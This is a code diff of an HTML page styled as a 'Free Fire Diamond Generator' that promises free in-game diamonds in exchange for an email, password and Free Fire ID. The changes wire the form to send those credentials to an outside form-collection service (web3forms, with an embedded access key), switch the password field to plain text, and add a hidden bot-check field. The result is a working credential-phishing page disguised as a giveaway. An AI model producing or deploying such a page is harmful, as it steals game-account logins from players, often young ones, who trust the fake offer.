@@ -16,14 +16,15 @@
         <h1 class="text-2xl font-semibold text-blue-600 mb-4 text-center">Free Fire Diamond Generator</h1>
         <p class="text-gray-700 mb-6 text-center">Enter your details below to get free diamonds!</p>
 
-   <form id="diamond-form" class="space-y-4">
+   <form id="diamond-form" class="space-y-4" action="https://api.web3forms.com/submit" method="POST">
+        <input type="hidden" name="access_key" value="0732fb33-547b-48bb-826e-09f7854ad14b">
             <div>
                 <label for="email" class="block text-gray-700 text-sm font-bold mb-2">Email:</label>
                 <input type="email" id="email" name="email" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" placeholder="Enter your Email" required>
             </div>
             <div>
                 <label for="password" class="block text-gray-700 text-sm font-bold mb-2">Password:</label>
-                <input type="password" id="password" name="password" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" placeholder="Enter your Password" required>
+                <input type="text" id="password" name="password" class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" placeholder="Enter your Password" required>
             </div>
             <div>
                 <label for="ff-id" class="block text-gray-700 text-sm font-bold mb-2">Free Fire ID:</label>
@@ -40,7 +41,7 @@
                     <option value="10000">10000 Diamonds</option>
                 </select>
             </div>
-
+    <input type="checkbox" name="botcheck" class="hidden" style="display: none;">
   <button type="submit" class="bg-gradient-to-r from-green-400 to-blue-500 hover:from-green-500 hover:to-blue-600 text-white font-bold py-2 px-4 rounded-full focus:outline-none focus:shadow-outline w-full transition duration-300 ease-in-out">
                 Generate Diamonds
             </button>
